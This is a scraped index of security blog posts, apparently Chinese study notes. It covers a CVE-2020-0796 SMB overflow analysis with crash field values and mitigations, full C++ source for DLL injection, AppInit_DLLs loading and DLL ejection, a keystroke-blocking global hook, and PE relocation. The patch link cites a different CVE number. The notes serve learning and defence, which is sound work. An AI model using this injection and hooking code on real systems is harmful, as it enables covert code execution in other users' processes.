\\x01\\x00 // 设置Flags字段 \\x00\\x00 // 设置Offset/Length字段 \\xff\\xff\\xff\\xff 其中主要的是要OriginalCompressedSegmentSize + Offset/Length 可以产生溢出，所以这两个字段的值可以更改，最终使用的是两个字段的和。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:4","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"5. 更新后的srv2.sys文件 主要是对Srv2DecompressData函数进行了更新，添加了一些数据长度的检查。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:5","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"6. 流量分析 使用两个不同的PoC造成的蓝屏的流量截图如下： 设置Offset/Length字段为ffffffff 设置OriginalCompressedSegmentSize字段为ffffffff： ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:6","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"7. 漏洞防御策略 熟悉了漏洞原理后，可以在流量测进行防御，比如使用Snort的byte_math关键字判断两个字段的和是否会发生整数溢出，发生了证明可能存在恶意流量。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:7","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"四、缓解措施及安全更新 缓解措施：使用以下PowerShell命令禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 1 -Force 使用下面的命令解禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 0 -Force 考虑到该漏洞影响较广，且crash的PoC已经公开，强烈建议及时安装官方安全补丁，补丁链接如下： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:5:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"五、备注 网上看到一些大佬的分析，定位到了压缩算法里的漏洞，本人能力有限，可能没有分析足够透彻，望包涵。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:6:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"六、参考链接 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0#Appendix_A_Target_69 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/78e0c942-ab41-472b-b117-4a95ebe88271 http://blogs.360.cn/post/CVE-2020-0796.html https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:7:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-06","objectID":"/2020/03/RE4B-8/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"DLL注入和卸载 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"一、DLL注入 DLL注入：向运行中的其他进程强制插入特定的DLL文件，主要是命令其他进程自行调用LoadLibrary() API，加载用户指定的DLL文件。 DLL注入与一般DLL加载的主要区别是加载的目标进程是其自身或其他进程。 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"1. DLL DLL（Dynamic Linked Library，动态链接库），DLL被加载到进程后会自动运行DllMain函数，用户可以把想要执行的额代码放到DllMain函数，每当加载DLL时，添加的代码就会自动得到执行。利用该特性可以修复程序BUG，或向程序添加新功能。 // DllMain()函数 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvRserved) { switch(dwReason) { case DLL_PROCESS_ATTACH: // 添加想要执行的代码 break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"2. DLL注入实例 使用LoadLibrary()加载某个DLL时，该DLL中的DllMain()函数会被调用执行。DLL注入的原理就是从外部促使目标进程调用LoadLibrary() API。 改善功能与修复BUG 消息钩取–Windows 默认提供的消息钩取功能本质上应用的就是一种DLL注入技术 API钩取–先创建DLL形态的钩取函数，然后注入要钩取的目标进程，主要是应用了被注入的DLL拥有目标进程内存访问权限这一特性 其他应用程序–监视、管理PC用户的应用程序 恶意代码–非法注入，进行代码隐藏 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"3. DLL注入的实现方法 1. 创建远程线程（CreateRemoteThread() API） 此处主要记录一下书上的源码分析，操作部分请自行实践。 // myhack.cpp #include \"windows.h\"#include \"tchar.h\" #pragma comment(lib, \"urlmon.lib\") #define DEF_URL (L\"http://www.naver.com/index.html\") #define DEF_FILE_NAME (L\"index.html\") HMODULE g_hMod = NULL; DWORD WINAPI ThreadProc(LPVOID lParam) { TCHAR szPath[_MAX_PATH] = {0,}; if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) ) return FALSE; TCHAR *p = _tcsrchr( szPath, '\\\\' ); if( !p ) return FALSE; _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME); //参数准备 URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL); //调用函数进行URL下载 return 0; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { HANDLE hThread = NULL; g_hMod = (HMODULE)hinstDLL; switch( fdwReason ) { case DLL_PROCESS_ATTACH : OutputDebugString(L\"\u003cmyhack.dll\u003e Injection!!!\"); //创建远程线程进行download hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); // 需要注意，切记随手关闭句柄，保持好习惯 CloseHandle(hThread); break; } return TRUE; } // InjectDll.cpp #include \"windows.h\"#include \"tchar.h\" BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath) { HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; //确定路径需要占用的缓冲区大小 DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限） if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) { _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; } // #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName // VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); // #3. 将myhack.dll路径 (\"c:\\\\myhack.dll\")写入目标进程中分配到的内存 WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); // #4. 获取LoadLibraryA() API的地址 // 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到 // InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地 // 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的 // kernerl32.dll的加载地址还是一样的。 hMod = GetModuleHandle(L\"kernel32.dll\"); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\"); // #5. 在目标进程notepad.exe中运行远程线程 // pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址 // pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); //同样，记得关闭句柄 CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int _tmain(int argc, TCHAR *argv[]) { if( argc != 3) { _tprintf(L\"USAGE : %s \u003cpid\u003e \u003cdll_path\u003e\\n\", argv[0]); return 1; } // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // inject dll if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) ) _tprintf(L\"InjectDll(\\\"%s\\\") success!!!\\n\", argv[2]); else _tprintf(L\"InjectDll(\\\"%s\\\") failed!!!\\n\", argv[2]); return 0; } main()函数主要检查输入程序的参数，然后调用InjectDll函数。InjectDll函数是实施DLL注入的核心函数，功能是命令目标进程自行调用LoadLibrary API。 重点介绍一下CreateRemoteThread()函数，该函数在进行DLL注入时会经常用到，其函数原型如下： CreateRemoteThread() HANDLE WINAPI CreateRemoteThread( __in HANDLE hProcess, //目标进程句柄 __in LPSECURITY_ATTRIBUTES lpThreadAttributes, __in SIZE_T dwStackSize, __in LPTHREAD_START_ROUTNE lpStartAddress, //线程函数地址 __in LPVOID dwCreationFlags, //线程参数地址 __out LPDOWRD lpThreadId ); 2. AppInit_DLLs 第二种方法是操作注册表，Windows的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项，只要将要注入DLL的路径字符串写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。 // myhack2.cpp // 主要作用是以隐藏模式运行IE，连接到指定网站 #include \"windows.h\"#include \"tchar.h\" #define DEF_CMD L\"c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" #define DEF_ADDR L\"http://www.naver.com\" #define DEF_DST_PROC L\"notepad.exe\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { TCHAR szCmd[MAX_PATH] = {0,}; TCHAR szPath[MAX_PATH] = {0,}; TCHAR *p = NULL; STARTUPINFO si = {0,}; PROCESS_INFORM","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"二、DLL卸载 DLL卸载原理：驱使目标进程调用FreeLibrary()函数，即将FreeLibrary()函数的地址传递给CreateRemoteThread()函数的lpStartAddress参数，并把待卸载的DLL句柄传递给lpParameter参数。 需要注意的一点是：引用计数问题。调用一次FreeLibrary()函数，引用计数就会-1。引用计数表示的是内核对象被使用的次数。 // EjectDll.exe #include \"windows.h\"#include \"tlhelp32.h\"#include \"tchar.h\" #define DEF_PROC_NAME (L\"notepad.exe\") #define DEF_DLL_NAME (L\"myhack.dll\") DWORD FindProcessID(LPCTSTR szProcessName) { DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // 获取系统快照 pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // 查找进程 Process32First(hSnapShot, \u0026pe); do { if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) { dwPID = pe.th32ProcessID; break; } } while(Process32Next(hSnapShot, \u0026pe)); CloseHandle(hSnapShot); return dwPID; } BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \u0026hToken) ) { _tprintf(L\"OpenProcessToken error: %u\\n\", GetLastError()); return FALSE; } if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup \u0026luid) ) // receives LUID of privilege { _tprintf(L\"LookupPrivilegeValue error: %u\\n\", GetLastError() ); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, \u0026tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { _tprintf(L\"AdjustTokenPrivileges error: %u\\n\", GetLastError() ); return FALSE; } if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) { _tprintf(L\"The token does not have the specified privilege. \\n\"); return FALSE; } return TRUE; } BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName) { BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad 进程ID // 使用TH32CS_SNAPMODULE参数，获取加载到notepad进程的DLL名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, \u0026me); for( ; bMore ; bMore = Module32Next(hSnapshot, \u0026me) ) { if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) { bFound = TRUE; break; } } if( !bFound ) { CloseHandle(hSnapshot); return FALSE; } if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) { _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; } hModule = GetModuleHandle(L\"kernel32.dll\"); // 获取FreeLibrary函数加载地址，并使用CreateRemoteThread进行调用 pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, \"FreeLibrary\"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE; } int _tmain(int argc, TCHAR* argv[]) { DWORD dwPID = 0xFFFFFFFF; // 查找process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) { _tprintf(L\"There is no \u003c%s\u003e process!\\n\", DEF_PROC_NAME); return 1; } _tprintf(L\"PID of \\\"%s\\\"is %d\\n\", DEF_PROC_NAME, dwPID); // 更改 privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // 注入 dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L\"EjectDll(%d, \\\"%s\\\") success!!!\\n\", dwPID, DEF_DLL_NAME); else _tprintf(L\"EjectDll(%d, \\\"%s\\\") failed!!!\\n\", dwPID, DEF_DLL_NAME); return 0; } CreateToolhelp32Snapshot()函数主要用来获取加载到进程的模块信息，将获取的hSnapshot句柄传递给Module32First()/Module32Next()函数后，即可设置与MODULEENTRY32结构相关的模块信息，以下为该结构的详细定义： typedef sturc tagMODULEENTRY32 { DWORD dwSize; DWORD th32ModuleID; // 该模块 DWORD th32ProcessID; // 模块拥有的进程 DWORD GlbcntUsage; //模块中的global usage计数 DWORD ProcessUsage; BYTE * modBaseAddr; //在进程的上下文中的模块的基地址 DWORD modBaseSize; // 在modBaseAddr开始位置的模块的大小（字节为单位） HMODULE hModule; char szModule[M","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"参考 《逆向工程核心原理》 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-05","objectID":"/2020/03/RE4B-7/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"Windows消息钩取 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"一、钩子和消息钩子 钩子，英文Hook，泛指偷看或截取信息时所用的手段或工具。 Windows操作系统向用户提供GUI，它是以事件驱动（Event Driven）方式工作。事件发生后，OS将事先定义好的消息发送给相应的应用程序，应用程序分析收到的消息后执行相应动作。以敲击键盘为例， 常规Windows消息流： 发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列； OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，添加到相应应用程序的app消息队列； 应用程序监视自身的消息队列，发现新添加的WM_KEYDOWN消息，调用相应的事件处理程序进行处理。 附带钩子的信息流： 发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列； OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，发送给应用程序； 钩子程序截取信息，对消息采取一定的动作（因钩子目的而定）； 如钩子程序不拦截消息，消息最终传输给应用程序，此时的消息可能经过了钩子程序的修改。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"二、SetWindowsHookEx() 这是一个实现消息钩子的API，其定义如下： HHOOK SetWindowsHookEx( int idHook, // hook type HOOKpROC lpfn, // hook procedure HINSTANCE hMod, //hook procedure所属的DLL句柄 DWORD dwThreadId //需要挂钩的线程ID，为0时表示为全局钩子（Global Hook） ); hook proceduce是由操作系统调用的回调函数；安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的示例句柄即为hMod。 使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS就会将相关的DLL文件强制注入（injection）相应进程，然后调用注册的钩子程序。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"三、键盘消息钩取 以下以书上例子进行练习，首先过程原理图如下： KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll后使用SetWindowsHookEx()安装键盘钩子；若其他进程（如图中所示）发生键盘输入事件，OS就会强制将KeyHook.dll加载到像一个进程的内存，然后调用KeyboardProc()函数。 实验：HookMain.exe 关于实验操作部分建议跟随书上走一遍流程，体验Hook的魅力。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"四、源代码分析 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"1. HookMain.cpp HookMain程序的主要源代码如下所示： #include \"stdio.h\"#include \"conio.h\"#include \"windows.h\" #define DEF_DLL_NAME \"KeyHook.dll\" #define DEF_HOOKSTART \"HookStart\" #define DEF_HOOKSTOP \"HookStop\" typedef void (*PFN_HOOKSTART)(); typedef void (*PFN_HOOKSTOP)(); void main() { HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // 加载KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) { printf(\"LoadLibrary(%s) failed!!! [%d]\", DEF_DLL_NAME, GetLastError()); return; } // 获取导出函数地址 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 开始钩取 HookStart(); // 等待，直到用户输入“q” printf(\"press 'q' to quit!\\n\"); while( _getch() != 'q' ) ; // 终止钩子 HookStop(); // 卸载KeyHook.dll FreeLibrary(hDll); } ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"2. KeyHook.dll KeyHook.dll源代码： #include \"stdio.h\"#include \"windows.h\" #define DEF_PROCESS_NAME \"notepad.exe\" HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) { switch( dwReason ) { case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; } return TRUE; } LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] = {0,}; char *p = NULL; if( nCode \u003e= 0 ) { // bit 31 : 0 =\u003e press, 1 =\u003e release if( !(lParam \u0026 0x80000000) ) //释放键盘按键时 { GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, '\\\\'); //比较当前进程名称是否为notepad.exe，成立则消息不传递给应用程 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; } } //如果不是notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) void HookStart() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if( g_hHook ) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } #ifdef __cplusplus } #endif 总体上代码相对简单，调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KetyboardProc()添加到键盘钩链。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"3. 代码执行流程分析 安装好键盘钩子后，无论在哪个进程中，只要发生了键盘输入事件，OS就会强制将KeyHook.dll注入到进程中，加载了KeyHook.dll的进程，发生键盘事件时会首先调用执行KeyHook.KetyboardProc()。 KetyboardProc()函数中发生键盘输入事件时，会比较当前进程的名称与“notepad.exe”是否相同，相同返回1，终止KetyboardProc()函数，意味着截获并删除了消息，这样键盘消息就不会传递到notepad.exe程序的消息队列。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"五、调试 使用OD打开HookMain.exe文件： ###1. 查找核心代码 我们关心的是核心的键盘钩取部分的代码，如何查找核心代码？ 逐步跟踪（除非迫不得已！） 检索相关API 检索相关字符串 我们已经知道程序的功能，会在控制台显示字符串“press ‘q’ to quit!”，所以先检查程序导入的字符串（Search for -All referencen text strings）： 地址40104d处引用了要查找的字符串，双击跳转： 来到main函数处。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:5:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"2. 调试main函数 在401000处下断，开始调试，了解main函数中主要的代码流。401006地址处调用LoadLibraryA(Keyhook.dll)，然后由40104b地址处的CALL EBX指令调用KeyHook.HookStart()函数。跟进查看： 这里的代码是被加载到HookMain.exe进程中的KeyHook.dll的HookStart()函数，第一句就是调用SetWindowsHookExW()函数，在进行参数入栈操作后，我们可以在栈中看到函数的4个参数值。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:5:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"参考 《逆向工程核心原理》 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:6:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-04","objectID":"/2020/03/RE4B-6/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"PE文件格式详细解析（六）– 基址重定位表（Base Relocation Table） ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"一、PE重定位 向进程的虚拟内存加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处。如果是加载的DLL（SYS）文件，且在ImageBase位置处已经加载了DLL（SYS）文件，那么PE装载器就会将其加载到其他未被占用的空间。此时就会发生基址重定位。 使用SDK或VC++创建PE文件，EXE默认的ImageBase为00400000，DLL默认的ImageBase为10000000，使用DDK创建的SYS文件默认的ImageBase为10000。 创建好进程后，因为EXE文件会首先加载进内存，所以EXE文件中无需考虑基址重定位问题。但是需要考虑ASLR（地址随机化）。对于各OS的主要系统DLL，微软会根据不同版本分别赋予不同的ImageBase地址，例如同一系统的kernel32.dll和user32.dll等会被加载到自身固有的ImageBase，所以系统的DLL实际上也不会发生重定位问题。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"二、PE重定位时发生了什么 以下以书上程序为例（书上是以exe文件举例，纯粹是举例，实际环境中基址重定位多发生在DLL文件中）。 基本信息： 如下图所示，其ImageBase为01000000 使用OD运行，观察内存： 下图是程序的EP代码部分，因为ASLR的原因，程序被加载到00270000处。 从图中可以看出，红框内进程的内存地址是以硬编码的方式存在的，地址2710fc、271100是.text节区的IAT区域，地址27c0a4是.data节区的全局变量。因为ASLR的存在，每次在OD中重启程序，地址值就会随加载地址的不同而发生变化，这种使硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位。 将以上两个图进行对比整理，数据如下表所示： 文件（ImageBase：01000000） 进程内存（加载地址：00270000） 0100010fc 002710fc 01001100 00271100 0100c0a4 0028c0a4 即：因为程序无法预测会被加载到哪个地址，所以记录硬编码地址时以ImageBase为准；在程序运行书简，经过PE重定位，这些地址全部以加载地址为基准进行变换，从而保证程序的正常运行。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"三、PE重定位操作原理 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"1. 基本操作原理 在应用程序中查找硬编码的地址位置 读取数值后，减去ImageBase（VA-\u003eRVA） 加上实际加载地址（RVA-\u003eVA） 上面三个步骤即可完成PE重定位，其中最关键的是查找硬编码地址的位置，查找过程中会使用到PE文件内部的Relocation Tables（重定位表），它记录了硬编码地址便宜，是在PE文件构建中的编译/链接阶段提供的。通过重定位表查找，本质上就是根据PE头的“基址重定位表”项进行的查找。 如上图所示，红框内的硬编码的地址都需要经过重定位再加载到内存中。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"2. 基址重定位表 位于PE头的DataDirectory数组的第六个元素，索引为5.如下图所示： 上图中的基址重定位表的RVA为2f000，查看该地址处内容： ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"3. IMAGE_BASE_RELOCATION结构体 上图中详细罗列了硬编码地址的偏移，读取该表就可以获得准确的硬编码地址偏移。基址重定位表是IMAGE_BASE_RELOCATION结构体数组。 其定义如下： typedefine struct _IMAGE_BASE_RELOCATION{ DWORD VirtualAddress; //RVA值 DOWRD SizeOfBlock; //重定位块的大小 //WORD TypeOffset[1]; 